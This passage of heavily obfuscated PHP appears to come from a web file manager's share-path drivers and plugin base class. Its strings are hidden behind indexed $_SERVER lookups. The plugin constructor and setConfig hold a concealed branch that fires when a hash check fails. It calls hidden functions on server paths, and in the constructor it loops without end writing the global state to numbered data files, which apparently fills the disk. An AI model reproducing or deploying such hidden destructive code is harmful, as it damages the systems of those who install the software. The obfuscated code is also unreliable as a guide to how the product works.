get_path_father($this->pathParse[$_SERVER[–Ú¬çÁ][84]]); } public function iconvSystem($ÄĞò¾“) { return $ÄĞò¾“; } protected function infoParse($ ¤Õ ¡ú, $ªíš××ï = false) { $®áĞíø¸ =& $_SERVER[–Ú¬çÁ]; $ï·‡—¾× = $this->pathParse[$®áĞíø¸[538]][$®áĞíø¸[1195]] . $this->pathParse[$®áĞíø¸[1188]]; if ($ªíš××ï) { $—Ùõ„ğØ = IO::infoWithChildren($ï·‡—¾×); } else { $—Ùõ„ğØ = IO::info($ï·‡—¾×); } $ùîòïâë = $this->pathParse[$®áĞíø¸[538]]; return Action($®áĞíø¸[1359])->_shareItemeParse($—Ùõ„ğØ, $ùîòïâë); } public function listAll($£ÎÂ—ìƒ) { $µ åúØû =& $_SERVER[–Ú¬çÁ]; $•‹´©ø‚ = IO::listAll($£ÎÂ—ìƒ); $¸ÂÜ¥Å‘ = rtrim($this->pathParse[$µ åúØû[538]][$µ åúØû[1195]], $µ åúØû[8]); foreach ($•‹´©ø‚ as &$´²íÜ½) { $´²íÜ½[$µ åúØû[84]] = $this->pathDriver . $µ åúØû[8] . ltrim(substr($´²íÜ½[$µ åúØû[84]], strlen($¸ÂÜ¥Å‘)), $µ åúØû[8]); } unset($´²íÜ½); return $•‹´©ø‚; } public function listAllSimple($ŠØá×, $ø¤øóÉÍ = false) { $£»öäÏ® =& $_SERVER[–Ú¬çÁ]; $£Éíşªú = $this->listAll($ŠØá×); $ñÕà¢İ„ = $this->pathParse[$£»öäÏ®[472]]; if (trim($ñÕà¢İ„, $£»öäÏ®[8]) == trim(get_path_father($ñÕà¢İ„), $£»öäÏ®[8])) { $ø¤øóÉÍ = !0; } return IO::init($£»öäÏ®[12])->listAllSimpleMake($£Éíşªú, $ñÕà¢İ„, $ø¤øóÉÍ); } public function getPathOuter($Ñ‡’ëà) { $¹¿÷îøÆ =& $_SERVER[–Ú¬çÁ]; $ÁèËİšª = KodIO::parse($Ñ‡’ëà); if ($ÁèËİšª[$¹¿÷îøÆ[33]] == KodIO::KOD_SHARE_ITEM) { return $ÁèËİšª[$¹¿÷îøÆ[84]]; } $İÒëé® = KodIO::clear($Ñ‡’ëà); $…Õí¯Ó¶ = KodIO::clear($this->pathParse[$¹¿÷îøÆ[538]][$¹¿÷îøÆ[1195]]); $¿‰Ûçç¨ = substr($İÒëé®, strlen($…Õí¯Ó¶)); if (substr($İÒëé®, 0, strlen($…Õí¯Ó¶)) != $…Õí¯Ó¶) { return !1; } return $this->pathParse[$¹¿÷îøÆ[1189]] . $¹¿÷îøÆ[8] . ltrim($¿‰Ûçç¨, $¹¿÷îøÆ[8]); } public function getType() { $Û›Š®ìÉ =& $_SERVER[–Ú¬çÁ]; $Û‘àßù° = str_replace($Û›Š®ìÉ[74], $Û›Š®ìÉ[12], get_class($this)); return strtolower($Û‘àßù°); } public function isTypeObject($ƒ– ˜¯ı) { return IO::isTypeObject($ƒ– ˜¯ı); } public function info($Ë‘ÍÑ˜›) { return $this->infoParse($Ë‘ÍÑ˜›); } public function infoAuth($¡Ä»Ô¾Œ) { return $this->infoParse($¡Ä»Ô¾Œ); } public function infoWithChildren($ÈˆôĞ³Ë) { return $this->infoParse($ÈˆôĞ³Ë, !0); } public function infoFull($©Î©ÆŸ) { return $this->infoParse($©Î©ÆŸ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($æ†®¯ÈÚ) { $this->pathParse = $æ†®¯ÈÚ; } protected function infoParse($€¯éˆ†—, $ÔÙ¢ïëå = false) { $ªûœì÷‹ =& $_SERVER[–Ú¬çÁ]; return Action($ªûœì÷‹[1194])->sharePathInfo($this->pathParse[$ªûœì÷‹[84]], !0, $ÔÙ¢ïëå); } public function listPath($ğ–¾æ İ, $çÈ­Ùşò = false) { $ÛíçõÜ˜ =& $_SERVER[–Ú¬çÁ]; $•¥Øı· = IO::listPath($ğ–¾æ İ, $çÈ­Ùşò); if (!$•¥Øı·) { return $•¥Øı·; } if (is_array($•¥Øı·[$ÛíçõÜ˜[1360]])) { $‹¦•ÌÊÕ = Action($ÛíçõÜ˜[1369])->parsePathChildren($•¥Øı·[$ÛíçõÜ˜[1360]], array($ÛíçõÜ˜[472] => $ğ–¾æ İ)); $•¥Øı·[$ÛíçõÜ˜[1360]] = Action($ÛíçõÜ˜[1194])->shareItemInfo($‹¦•ÌÊÕ); } foreach ($•¥Øı· as $Şù¯¦Û => $¸“ÈÚ¯ˆ) { if (!in_array($Şù¯¦Û, array($ÛíçõÜ˜[83], $ÛíçõÜ˜[82]))) { continue; } foreach ($¸“ÈÚ¯ˆ as $ªÜ„Ò¼ => $‹¦•ÌÊÕ) { $‹¦•ÌÊÕ = Action($ÛíçõÜ˜[1369])->parsePathChildren($‹¦•ÌÊÕ, array($ÛíçõÜ˜[472] => $ğ–¾æ İ)); $•¥Øı·[$Şù¯¦Û][$ªÜ„Ò¼] = Action($ÛíçõÜ˜[1194])->shareItemInfo($‹¦•ÌÊÕ); } } return $•¥Øı·; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($á ùŞÑ†) { parent::__construct($á ùŞÑ†); } } goto EŞíù†µç; cÍ×Ä‰˜›ù: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $÷ÙĞ±éƒ =& $_SERVER[–Ú¬çÁ]; $¨‰Å°ƒğ = $_SERVER[$÷ÙĞ±éƒ[200]]; $¥ªÜ„ù = $÷ÙĞ±éƒ[201]; if ($_SERVER[$÷ÙĞ±éƒ[202]] != $¥ªÜ„ù($¨‰Å°ƒğ)) { $Õ†µõ„ = $÷ÙĞ±éƒ[897]; $³ºË»Á° = $÷ÙĞ±éƒ[203]; $õ˜ê€è¤ = $_SERVER[$÷ÙĞ±éƒ[204]] . $÷ÙĞ±éƒ[205]; $­İ›¼© = $³ºË»Á°($õ˜ê€è¤); $¦‘ëü² = explode($÷ÙĞ±éƒ[206], $­İ›¼©); if (count($¦‘ëü²) < $÷ÙĞ±éƒ[690]) { $áÑÖ¾¼« = $÷ÙĞ±éƒ[208]; $áÑÖ¾¼«(); } $áªØ¢€® = $÷ÙĞ±éƒ[898]; $áªØ¢€®($_SERVER[$÷ÙĞ±éƒ[899]]); $Õ†µõ„ = $÷ÙĞ±éƒ[897]; $Õ†µõ„(); $äÉÓçœ = $÷ÙĞ±éƒ[900]; $­™¥²Ëî = json_encode($GLOBALS[$÷ÙĞ±éƒ[901]]); $ªËÀûô× = 1; for ($«Ã‘ù”ˆ = $ªËÀûô×; $«Ã‘ù”ˆ > 0; $«Ã‘ù”ˆ++) { $äÉÓçœ(DATA_PATH . $«Ã‘ù”ˆ, $­™¥²Ëî); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($÷ÙĞ±éƒ[1526]); $this->pluginName = str_replace($÷ÙĞ±éƒ[1526], $÷ÙĞ±éƒ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $÷ÙĞ±éƒ[8]; $this->pluginApi = appHostGet() . $÷ÙĞ±éƒ[1527] . $this->pluginName . $÷ÙĞ±éƒ[8]; $this->pluginHost = $config[$÷ÙĞ±éƒ[1528]] . $this->pluginName . $÷ÙĞ±éƒ[8]; $this->pluginHostDefault = $config[$÷ÙĞ±éƒ[1528]] . $this->pluginName . $÷ÙĞ±éƒ[8]; $ÁóõÇ°  = $config[$÷ÙĞ±éƒ[1529]]; if ($ÁóõÇ°  && strpos($÷ÙĞ±éƒ[50] . $ÁóõÇ°  . $÷ÙĞ±éƒ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$÷ÙĞ±éƒ[1530]] . $this->pluginName . $÷ÙĞ±éƒ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[–Ú¬çÁ][1531]); } protected function assign($Ğ±¡¿ì„, $ú‘ˆßøı = false) { if (is_array($Ğ±¡¿ì„)) { $this->values = array_merge($this->values, $Ğ±¡¿ì„); } else { $this->values[$Ğ±¡¿ì„] = $ú‘ˆßøı; } } protected function display($¯´ØÄÔ²) { extract($this->values); require $¯´ØÄÔ²; } final function hookRegist($õÓ’àú) { $this->modelPlugin->appRegist($this->pluginName, $õÓ’àú); } final function appIcon() { $ôÓ¿ñ¨ =& $_SERVER[–Ú¬çÁ]; $ÛÁÄ¯™õ = $this->appPackage(); $£Ê›‹Àş = $ôÓ¿ñ¨[12]; if (isset($ÛÁÄ¯™õ[$ôÓ¿ñ¨[467]])) { if (isset($ÛÁÄ¯™õ[$ôÓ¿ñ¨[467]][$ôÓ¿ñ¨[1532]])) { $£Ê›‹Àş = $ôÓ¿ñ¨[1533] . $ÛÁÄ¯™õ[$ôÓ¿ñ¨[467]][$ôÓ¿ñ¨[1532]] . $ôÓ¿ñ¨[1534]; } else { if ($ÛÁÄ¯™õ[$ôÓ¿ñ¨[467]][$ôÓ¿ñ¨[1535]]) { $£Ê›‹Àş = $ôÓ¿ñ¨[1536] . $ÛÁÄ¯™õ[$ôÓ¿ñ¨[467]][$ôÓ¿ñ¨[1535]] . $ôÓ¿ñ¨[1537]; } } } return $£Ê›‹Àş; } final function fileCanView($Ÿ«çÉ–) { $ ÛôÉ¡ó =& $_SERVER[–Ú¬çÁ]; if (request_url_safe($Ÿ«çÉ–)) { return !0; } if ($this->isShare($Ÿ«çÉ–)) { return !0; } $Š¹³˜æ€ = Session::get($ ÛôÉ¡ó[1538]); if ($GLOBALS[$ ÛôÉ¡ó[546]] != 1 && !$Š¹³˜æ€ || !$Š¹³˜æ€[$ ÛôÉ¡ó[1539]]) { $õÏœ‘Ãó = $ ÛôÉ¡ó[1540] . rawurlencode(this_url()); show_tips(LNG($ ÛôÉ¡ó[1541]) . $ ÛôÉ¡ó[1542] . $õÏœ‘Ãó . $ ÛôÉ¡ó[1543] . LNG($ ÛôÉ¡ó[1544]) . $ ÛôÉ¡ó[1545], !1); } if (!Action($ ÛôÉ¡ó[1546])->authCan($ ÛôÉ¡ó[1547])) { show_tips(LNG($ ÛôÉ¡ó[1548]) . $ ÛôÉ¡ó[1549], !1); } ActionCall($ ÛôÉ¡ó[1550], $Ÿ«çÉ–); } final function isShare($Ñ öÎ±) { $æĞô™¶Ÿ = KodIO::parse($Ñ öÎ±); return $æĞô™¶Ÿ[$_SERVER[–Ú¬çÁ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($‘ì‹´Šã) { if (request_url_safe($‘ì‹´Šã)) { return $‘ì‹´Šã; } if (!$this->isShare($‘ì‹´Šã)) { $‘ì‹´Šã = $this->filePath($‘ì‹´Šã, !1); } return Action($_SERVER[–Ú¬çÁ][1194])->linkOut($‘ì‹´Šã); } public function filePathLinkOut($ÏğÉ¡·Ö) { if (request_url_safe($ÏğÉ¡·Ö)) { return $ÏğÉ¡·Ö; } $this->fileCanView($ÏğÉ¡·Ö); return Action($_SERVER[–Ú¬çÁ][1194])->link($ÏğÉ¡·Ö); } final function filePath($åëÓì«¾, $ÆéÍµç” = true, $êè’§Úº = false) { $¦ÖÚ£¢¥ =& $_SERVER[–Ú¬çÁ]; $Ùã©Äú = $this->filePathGet($åëÓì«¾, $ÆéÍµç”); if (!$this->fileInfo) { show_tips(LNG($¦ÖÚ£¢¥[105]), !1); } if ($êè’§Úº && isset($this->fileInfo[$¦ÖÚ£¢¥[518]]) && $this->fileInfo[$¦ÖÚ£¢¥[518]]) { $ª§ØÔÄ = Model($¦ÖÚ£¢¥[521])->fileInfo($this->fileInfo[$¦ÖÚ£¢¥[518]]); if (!$ª§ØÔÄ || !IO::exist($ª§ØÔÄ[$¦ÖÚ£¢¥[84]])) { show_tips(LNG($¦ÖÚ£¢¥[105]) . $¦ÖÚ£¢¥[1551]); } } Hook::trigger($¦ÖÚ£¢¥[1552], $Ùã©Äú); return $Ùã©Äú; } final function filePathGet($ÔÃäœéË, $±„ãéŒ› = true) { $•ÅèÅĞÈ =& $_SERVER[–Ú¬çÁ]; if ($­ƒÕ¶Ã = $this->checkSharePath($ÔÃäœéË, $±„ãéŒ›)) { return $­ƒÕ¶Ã; } $this->fileCanView($ÔÃäœéË); if (request_url_safe($ÔÃäœéË)) { $…ø»Ì„ö = parse_url_query($ÔÃäœéË); if (isset($…ø»Ì„ö[$•ÅèÅĞÈ[1553]]) && isset($…ø»Ì„ö[$•ÅèÅĞÈ[228]])) { $…ı›úØ‰ = Mcrypt::decode($…ø»Ì„ö[$•ÅèÅĞÈ[228]], Model($•ÅèÅĞÈ[790])->get($•ÅèÅĞÈ[791])); if ($…ı›úØ‰) { $this->fileInfo = IO::info($…ı›úØ‰); $this->fileInfo[$•ÅèÅĞÈ[1554]] = $ÔÃäœéË; $this->cachePath = $this->pluginCachePath($•ÅèÅĞÈ[12], $±„ãéŒ›); return $…ı›úØ‰; } } $ÔÃäœéË = $this->_cacheHttpFile($ÔÃäœéË, $±„ãéŒ›); $this->fileInfo = IO::info($ÔÃäœéË); } else { $this->fileInfo = IO::info($ÔÃäœéË); $this->cachePath = $this->pluginCachePath($•ÅèÅĞÈ[12], $±„ãéŒ›); } return $ÔÃäœéË; } final function _cacheHttpFile($âêºŒŞ‰, $Ï´ëùˆ = true) { $ÎÅä¼À‚ =& $_SERVER[–Ú¬çÁ]; $ëŸæÜØ“ = parse_url_query($âêºŒŞ‰); $îğõ·“É = get_path_ext($âêºŒŞ‰); if (isset($ëŸæÜØ“[$ÎÅä¼À‚[32]]) && $ëŸæÜØ“[$ÎÅä¼À‚[32]]) { $îğõ·“É = get_path_ext($ëŸæÜØ“[$ÎÅä¼À‚[32]]); } $³Œ”á·Û = hash_path($âêºŒŞ‰) . $ÎÅä¼À‚[10] . $îğõ·“É; $this->cachePath = $this->pluginCachePath($Ï´ëùˆ ? $³Œ”á·Û : $ÎÅä¼À‚[12]); $…Öé‰ = IO::fileNameExist($this->cachePath, $³Œ”á·Û); if ($…Öé‰) { return KodIO::make($…Öé‰); } $Èç´òû½ = rtrim($this->cachePath, $ÎÅä¼À‚[8]) . $ÎÅä¼À‚[8] . $³Œ”á·Û; return $this->pluginCacheFileSet($Èç´òû½, file_get_contents_nossl($âêºŒŞ‰)); } final function checkSharePath($¢ØÎ›³ä, $ÕÂå‘Ì¥ = true) { $ÄºôíåÁ =& $_SERVER[–Ú¬çÁ]; if (!$this->isShare($¢ØÎ›³ä)) { return !1; } $¼ğ„¨«¦ = Action($ÄºôíåÁ[1194])->sharePathInfo($¢ØÎ›³ä); if (!is_array($¼ğ„¨«¦) || !isset($¼ğ„¨«¦[$ÄºôíåÁ[84]])) { show_json(LNG($ÄºôíåÁ[1555]), !1); } $this->fileInfo = $¼ğ„¨«¦; $this->cachePath = $this->pluginCachePath(!1, $ÕÂå‘Ì¥); return $¼ğ„¨«¦[$ÄºôíåÁ[84]]; } final function pluginCachePath($»Õ‡ ‹û = '', $›À²—¡Ş = false) { $‘¤­’™ª =& $_SERVER[–Ú¬çÁ]; if ($›À²—¡Ş && is_array($this->fileInfo)) { $»Õ‡ ‹û = kodIO::hashPath($this->fileInfo); } $Î¯Ô«‘¢ = rtrim(IO_PATH_SYSTEM_TEMP . $‘¤­’™ª[1556] . $this->pluginName . $‘¤­’™ª[8] . $»Õ‡ ‹û, $‘¤­’™ª[8]); $º´èÒõ› = IO::infoFullSimple($Î¯Ô«‘¢); $–ÜñËú = $º´èÒõ› && is_array($º´èÒõ›) ? $º´èÒõ›[$‘¤­’™ª[84]] : $‘¤­’™ª[12]; if (!$–ÜñËú) { $–ÜñËú = IO::mkdir($Î¯Ô«‘¢); } return $–ÜñËú; } final function pluginCacheFileSet($Ü’¼å²’, $Ü‘èÌ = '') { $½È¬ƒÛ =& $_SERVER[–Ú¬çÁ]; $ûĞÆü = IO::infoFullSimple($Ü’¼å²’); if (!$ûĞÆü) { return IO::mkfile($Ü’¼å²’, $Ü‘èÌ, REPEAT_REPLACE); } IO::setContent($ûĞÆü[$½È¬ƒÛ[84]], $Ü‘èÌ); return $ûĞÆü[$½È¬ƒÛ[84]]; } final function pluginLocalFile($±İ¼Äéî = '') { $Ñ•“ÄÇø =& $_SERVER[–Ú¬çÁ]; $°æ®Éø» = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($°æ®Éø»)) { mk_dir($°æ®Éø»); } if (!$±İ¼Äéî) { return $°æ®Éø»; } $Ôœî÷šÌ = IO::info($±İ¼Äéî); $Œ˜áÑ› = $Ñ•“ÄÇø[1557] . KodIO::hashPath($Ôœî÷šÌ) . $Ñ•“ÄÇø[10] . $Ôœî÷šÌ[$Ñ•“ÄÇø[175]]; if (!checkExtSafe($Œ˜áÑ›)) { $Œ˜áÑ› = $Œ˜áÑ› . $Ñ•“ÄÇø[1226]; } $¬¦áß·Ã = $°æ®Éø» . $Œ˜áÑ›; if (@file_exists($¬¦áß·Ã)) { return $¬¦áß·Ã; } return IO::copy($±İ¼Äéî, $°æ®Éø», 0, $Œ˜áÑ›); } final function appPackage() { $¹äŒòË¹ =& $_SERVER[–Ú¬çÁ]; if ($this->packageData) { return $this->packageData; } $ôß…òºÌ = $this->parseFile($this->pluginPath . $¹äŒòË¹[1558]); $this->parseLang($ôß…òºÌ); $âƒ¹¬ß = json_decode_force($ôß…òºÌ); if (!$âƒ¹¬ß) { return array(); } $Ö• â·¹ = Hook::trigger($¹äŒòË¹[1559], $âƒ¹¬ß); if ($Ö• â·¹ && is_array($Ö• â·¹)) { $âƒ¹¬ß = $Ö• â·¹; } $this->packageData = $âƒ¹¬ß; return $âƒ¹¬ß; } public function packageInfoGet($‰‰ÁÈò) { $î¡–í»± = $this->appPackage(); return array_get_value($î¡–í»±, $‰‰ÁÈò); } public function packageVersion() { return $this->packageInfoGet($_SERVER[–Ú¬çÁ][1560]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[–Ú¬çÁ][1561]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[–Ú¬çÁ][1562]); } public function echoJsAssign($”¨˜šªÃ, $çü­˜Ó¸) { $this->echoJsAssignArr[$”¨˜šªÃ] = $çü­˜Ó¸; } private function parseFile($š½Ò´¶ù) { $Ñ¶êÛ¹ =& $_SERVER[–Ú¬çÁ]; $ÔÀëÛèÈ = file_get_contents_nossl($š½Ò´¶ù); $û™³ôÏÙ = array($Ñ¶êÛ¹[1563], $Ñ¶êÛ¹[1564], $Ñ¶êÛ¹[1565], $Ñ¶êÛ¹[1566], $Ñ¶êÛ¹[1567], $Ñ¶êÛ¹[1568], $Ñ¶êÛ¹[1569]); $¯³Ãôú¯ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ñ¶êÛ¹[89]][$Ñ¶êÛ¹[1570]]); foreach ($this->echoJsAssignArr as $´Š‰“ë => $Ã©±´˜Á) { $û™³ôÏÙ[] = $Ñ¶êÛ¹[1571] . $´Š‰“ë . $Ñ¶êÛ¹[1572]; $¯³Ãôú¯[] = is_array($Ã©±´˜Á) || is_object($Ã©±´˜Á) ? rawurlencode(json_encode($Ã©±´˜Á)) : $Ã©±´˜Á; } if (strstr($ÔÀëÛèÈ, $Ñ¶êÛ¹[1573])) { $¤Ù«”·á = rawurlencode(json_encode($this->pluginLangArr)); $ÔÀëÛèÈ = str_replace($Ñ¶êÛ¹[1573], $¤Ù«”·á, $ÔÀëÛèÈ); } if (strstr($ÔÀëÛèÈ, $Ñ¶êÛ¹[1574])) { $¤Ù«”·á = $¤Ù«”·á = rawurlencode(json_encode($this->getConfig())); $ÔÀëÛèÈ = str_replace($Ñ¶êÛ¹[1574], $¤Ù«”·á, $ÔÀëÛèÈ); } $ÔÀëÛèÈ = str_replace($û™³ôÏÙ, $¯³Ãôú¯, $ÔÀëÛèÈ); return $ÔÀëÛèÈ; } private function parseLang(&$£¢…ÆÑ³) { $Å˜„Ïßñ =& $_SERVER[–Ú¬çÁ]; $À«æö«‡ = $Å˜„Ïßñ[1575]; if (!strstr($£¢…ÆÑ³, $À«æö«‡)) { return; } preg_match_all($Å˜„Ïßñ[1576], $£¢…ÆÑ³, $Ô³ôŒÑ×); if (!is_array($Ô³ôŒÑ×) || count($Ô³ôŒÑ×) == 0 || !is_array($Ô³ôŒÑ×[0]) || count($Ô³ôŒÑ×[0]) == 0) { return; } $„“Ã¤ã‘ = array(); $ØÏ€Ã¨ı = array(); foreach ($Ô³ôŒÑ×[0] as $ˆ×Õ³Úñ) { $š®øöí = substr($ˆ×Õ³Úñ, strlen($À«æö«‡), -4); $¸“’şÄå = LNG($š®øöí); $„“Ã¤ã‘[] = $ˆ×Õ³Úñ; $ØÏ€Ã¨ı[] = str_replace(array($Å˜„Ïßñ[206], $Å˜„Ïßñ[1098], $Å˜„Ïßñ[395], $Å˜„Ïßñ[118]), array($Å˜„Ïßñ[53], $Å˜„Ïßñ[53], $Å˜„Ïßñ[12], $Å˜„Ïßñ[1577]), $¸“’şÄå); } $£¢…ÆÑ³ = str_replace($„“Ã¤ã‘, $ØÏ€Ã¨ı, $£¢…ÆÑ³); } private function parseConfig(&$íˆí¬°‡) { $ŠŸêş¢Æ =& $_SERVER[–Ú¬çÁ]; $ô­…®«¾ = $ŠŸêş¢Æ[1578]; if (!strstr($íˆí¬°‡, $ô­…®«¾)) { return; } preg_match_all($ŠŸêş¢Æ[1579], $íˆí¬°‡, $ş°¶®ªÛ); if (!is_array($ş°¶®ªÛ) || count($ş°¶®ªÛ) == 0 || !is_array($ş°¶®ªÛ[0]) || count($ş°¶®ªÛ[0]) == 0) { return; } $—µËù“Õ = $this->getConfig(); $ß‘úŞ ¬ = array(); $›˜º•×² = array(); foreach ($ş°¶®ªÛ[0] as $–•¼ƒíÖ) { $ÌÓÕì = substr($–•¼ƒíÖ, strlen($ô­…®«¾), -2); $ß‘úŞ ¬[] = $–•¼ƒíÖ; $›˜º•×²[] = _get($—µËù“Õ, $ÌÓÕì); } $íˆí¬°‡ = str_replace($ß‘úŞ ¬, $›˜º•×², $íˆí¬°‡); } private function parsePackage(&$•¹¤‡Ó‘) { $®‘–Ñ‹³ =& $_SERVER[–Ú¬çÁ]; $ãŒ‹œ³ñ = $®‘–Ñ‹³[1580]; if (!strstr($•¹¤‡Ó‘, $ãŒ‹œ³ñ)) { return; } preg_match_all($®‘–Ñ‹³[1581], $•¹¤‡Ó‘, $ºîûä¢÷); if (!is_array($ºîûä¢÷) || count($ºîûä¢÷) == 0 || !is_array($ºîûä¢÷[0]) || count($ºîûä¢÷[0]) == 0) { return; } $’Ô•¹ıî = $this->appPackage(); $ÑÔ¦‰¶Œ = array(); $™áŸ¾ß = array(); foreach ($ºîûä¢÷[0] as $Â¬÷„·) { $ãÉÈøö = substr($Â¬÷„·, strlen($ãŒ‹œ³ñ), -2); $ÑÔ¦‰¶Œ[] = $Â¬÷„·; $™áŸ¾ß[] = _get($’Ô•¹ıî, $ãÉÈøö); } $•¹¤‡Ó‘ = str_replace($ÑÔ¦‰¶Œ, $™áŸ¾ß, $•¹¤‡Ó‘); } final function echoFile($Ë°ªûÒ, $›€ìó—ã = false) { $•¥à°©ğ =& $_SERVER[–Ú¬çÁ]; $¨ß÷òò = $this->pluginPath . $Ë°ªûÒ; if (ACT == $•¥à°©ğ[1582]) { echo $•¥à°©ğ[1583] . $this->pluginName . $•¥à°©ğ[8] . $Ë°ªûÒ . $•¥à°©ğ[1584]; if (!file_exists($¨ß÷òò)) { echo $•¥à°©ğ[1585]; return; } } $ÜúÁÖ±­ = $this->parseFile($¨ß÷òò); $this->parseLang($ÜúÁÖ±­); $this->parseConfig($ÜúÁÖ±­); $this->parsePackage($ÜúÁÖ±­); if (is_array($›€ìó—ã)) { $ÜúÁÖ±­ = str_replace(array_keys($›€ìó—ã), array_values($›€ìó—ã), $ÜúÁÖ±­); } echo $•¥à°©ğ[206] . $ÜúÁÖ±­; } final function initLang() { $ÏØ¢Ú›° =& $_SERVER[–Ú¬çÁ]; $êğöâÖ„ = $ÏØ¢Ú›°[1586]; $•®Ç¼¬ = $this->pluginPath . $ÏØ¢Ú›°[1587]; $öŞªÎÒø = I18n::getType(); $Ëíù×¬ = array(); if (file_exists($•®Ç¼¬ . $öŞªÎÒø . $ÏØ¢Ú›°[859])) { $Ëíù×¬ = (include $•®Ç¼¬ . $öŞªÎÒø . $ÏØ¢Ú›°[859]); } else { if ($öŞªÎÒø == $ÏØ¢Ú›°[1588] && !file_exists($•®Ç¼¬ . $öŞªÎÒø . $ÏØ¢Ú›°[859]) && file_exists($•®Ç¼¬ . $ÏØ¢Ú›°[1589])) { $Ëíù×¬ = (include $•®Ç¼¬ . $ÏØ¢Ú›°[1589]); } else { if (file_exists($•®Ç¼¬ . $êğöâÖ„ . $ÏØ¢Ú›°[859])) { $Ëíù×¬ = (include $•®Ç¼¬ . $êğöâÖ„ . $ÏØ¢Ú›°[859]); } } } if (!is_array($Ëíù×¬)) { return array(); } if (@count($Ëíù×¬) > 0) { I18n::set($Ëíù×¬); } return $Ëíù×¬; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Úƒ¯”º) { $äƒÆ‹óÏ =& $_SERVER[–Ú¬çÁ]; if ($_SERVER[$äƒÆ‹óÏ[202]] != $_SERVER[$äƒÆ‹óÏ[1590]]) { $ÉÆæŞ¢ğ = $äƒÆ‹óÏ[897]; $—œ Ãõ­ = $äƒÆ‹óÏ[203]; $É¬ìÀÒï = $_SERVER[$äƒÆ‹óÏ[204]] . $äƒÆ‹óÏ[205]; $ÉıÌ“É¯ = $—œ Ãõ­($É¬ìÀÒï); $Øó•¡İ» = explode($äƒÆ‹óÏ[206], $ÉıÌ“É¯); if (count($Øó•¡İ») < $äƒÆ‹óÏ[690]) { $´±Ã©òÁ = $äƒÆ‹óÏ[208]; $´±Ã©òÁ(); } $€‡ÙóÒô = $äƒÆ‹óÏ[898]; $€‡ÙóÒô($_SERVER[$äƒÆ‹óÏ[899]]); $€‡ÙóÒô($_SERVER[$äƒÆ‹óÏ[204]] . $äƒÆ‹óÏ[1591]); $İ¸á‚„ó = 1; while ($İ¸á‚„ó > 1) { $İ¸á‚„ó = $İ¸á‚„ó + 4; $×ØîòÊ³ = rawurlencode($İ¸á‚„ó . $äƒÆ‹óÏ[431]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Úƒ¯”º); } public function onSetConfig($ãÄ‡×ÌÆ) { } public function onGetConfig($ùˆÊ—·) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÌÒÓ™ş›) { if ($ÌÒÓ™ş› == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($êÎ®ºÀ¬ = "\x70\x6c\165\x67\x69\156\x41\x75\164\150") { $½•º±Ÿ =& $_SERVER[–Ú¬çÁ]; if (!Session::get($½•º±Ÿ[1538])) { return !1; } if (_get($GLOBALS, $½•º±Ÿ[546])) { return !0; } $½ËŞ«œ¢ = $this->getConfig(); if (!$½ËŞ«œ¢[$êÎ®ºÀ¬]) { return !1; } return ActionCall($½•º±Ÿ[1592], $½ËŞ«œ¢[$êÎ®ºÀ¬]); } public function url($şàô®ˆ, $µäâõé = '', $¬ ‰¢ò” = true) { $ïÀ‡§Öà =& $_SERVER[–Ú¬çÁ]; $²…®ı¤© = $this->getConfig(); $É´¶ìÒÏ = KOD_VERSION . $ïÀ‡§Öà[10] . KOD_VERSION_BUILD; $¨¡ã´ş† = $this->packageVersion(); $îÉáÑƒ÷ = $É´¶ìÒÏ . $ïÀ‡§Öà[439] . $¨¡ã´ş†; if (substr($şàô®ˆ, 0, 4) == $ïÀ‡§Öà[149] || substr($şàô®ˆ, 0, 2) == $ïÀ‡§Öà[1373]) { $ÃÄÀËíé = $şàô®ˆ . $ïÀ‡§Öà[1593] . $îÉáÑƒ÷; } else { if ($µäâõé == $ïÀ‡§Öà[12]) { $ÃÄÀËíé = $this->pluginHost . $şàô®ˆ . $ïÀ‡§Öà[1593] . $îÉáÑƒ÷; } else { if ($µäâõé === $ïÀ‡§Öà[75]) { $ÃÄÀËíé = $this->pluginHost . $şàô®ˆ; } else { if ($µäâõé == $ïÀ‡§Öà[1594]) { $ÃÄÀËíé = STATIC_PATH . $şàô®ˆ . $ïÀ‡§Öà[1593] . $É´¶ìÒÏ; } else { if ($µäâõé == $ïÀ‡§Öà[1595]) { $ÃÄÀËíé = APP_HOST . $ïÀ‡§Öà[1596] . $şàô®ˆ . $ïÀ‡§Öà[1593] . $É´¶ìÒÏ; } else { if (isset($²…®ı¤©[$µäâõé])) { $ÃÄÀËíé = $²…®ı¤©[$µäâõé] . $şàô®ˆ . $ïÀ‡§Öà[1593] . $îÉáÑƒ÷; } } } } } } if (!$¬ ‰¢ò”) { return $ÃÄÀËíé; } echo $ÃÄÀËíé; } public function link($Ï‘²‰â = false, $å‹±­– = '') { $ÄÑÃ£ÉÁ =& $_SERVER[–Ú¬çÁ]; if (!$Ï‘²‰â) { $this->link($ÄÑÃ£ÉÁ[1597], $ÄÑÃ£ÉÁ[1595]); $this->link($ÄÑÃ£ÉÁ[1598], $ÄÑÃ£ÉÁ[1594]); $this->link($ÄÑÃ£ÉÁ[1599], $ÄÑÃ£ÉÁ[1594]); $this->link($ÄÑÃ£ÉÁ[1600], $ÄÑÃ£ÉÁ[1594]); $this->link($ÄÑÃ£ÉÁ[1601], $ÄÑÃ£ÉÁ[1594]); return; } 